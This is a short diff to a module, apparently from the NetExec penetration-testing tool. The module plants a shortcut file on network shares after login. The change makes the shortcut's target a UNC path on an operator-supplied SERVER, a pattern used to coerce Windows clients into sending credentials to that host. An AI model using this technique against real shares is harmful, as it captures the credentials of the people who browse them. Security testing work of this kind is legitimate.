@@ -66,9 +66,8 @@ class NXCModule:
 
         if not self.cleanup:
             self.server = module_options["SERVER"]
-            link = pylnk3.create(self.local_lnk_path)
-            link.icon = self.ico_uri if self.ico_uri else f"\\\\{self.server}\\icons\\icon.ico"
-            link.save()
+            target_path = f"\\\\{self.server}\\share\\{self.lnk_name}.ico"
+            pylnk3.for_file(target_path, self.local_lnk_path)
 
     def on_login(self, context, connection):
         shares = connection.shares()
